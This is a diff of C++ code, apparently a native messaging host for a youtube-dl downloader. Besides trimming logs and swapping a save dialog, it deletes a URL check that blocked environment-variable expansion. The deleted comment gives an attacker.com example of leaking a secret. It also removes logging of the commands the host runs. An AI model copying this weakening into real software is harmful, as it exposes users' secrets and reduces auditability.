@@ -66,9 +66,10 @@ int main(int argc, char *argv[])
 		try
 		{
 			string raw_message = messaging::get_message();
+
 			PLOG_INFO << "received message: " << raw_message;
+
 			Json msg = utils::parseJSON(raw_message);
-			PLOG_INFO << "message parsed";
 			processMessage(msg);
 		}
 		catch(fatal_exception &e)
@@ -190,7 +191,6 @@ void handle_download(const Json &msg)
 // for example {"name": "\"jack\""} becomes \"jack\" instead of just "jack"
 void handle_userCMD(const Json &msg)
 {
-	PLOG_INFO << "handling cmd";
 	try
 	{
 		string cmd = msg["cmd"].AsString();
@@ -198,8 +198,6 @@ void handle_userCMD(const Json &msg)
 		bool showConsole = msg["showConsole"].AsBool();
 		bool showSaveas = msg["showSaveas"].AsBool();
 		cmd = from_base64(cmd);
-
-		PLOG_INFO << "running " << cmd;
 
 		std::thread th1(custom_command_th, cmd, filename, showConsole, showSaveas);
 		th1.detach();
@@ -293,7 +291,7 @@ void custom_command_th(string cmd, const string filename, bool showConsole, bool
 
 		if(showSaveas)
 		{
-			savePath = utils::folderOpenDialog();
+			savePath = utils::fileSaveDialog(filename);
 
 			// if user chose cancel in browse dialog do nothing
 			if(savePath.length() == 0)
@@ -467,20 +465,6 @@ process_result ytdl(const string &url, const string &dlHash, vector<string> &arg
 {
 	try
 	{
-		//an attacker could make the user request a malicious URL and steal environment variables from them
-		//for example if the users tries to download https://attacker.com/script.php?secret=%secret% then upon 
-		//receiving this command line argument youtubedl will replace %secret% with the corresponding env. variable value
-		//and send it to the attacker
-		//not really a huge deal because nobody should put secrets in environment variables anyway and also
-		//we are url-encoding our URLs so it would be difficult to come up with a URL that would leak an actual env. var
-		//but not impossible
-		//this could also happen by accident leading to undefined behavior
-		//so we search the URL and if we find any env. variables in it we just reject it
-		if(utils::strHasEnvars(url))
-		{
-			throw grb_exception("This URL is not supported");
-		}
-
 		//create a kill switch for this download and store it in the map
 		ytdlKillSwitches.insert(pair<string, bool>(dlHash, false));
 		bool &killSwitch = ytdlKillSwitches[dlHash];
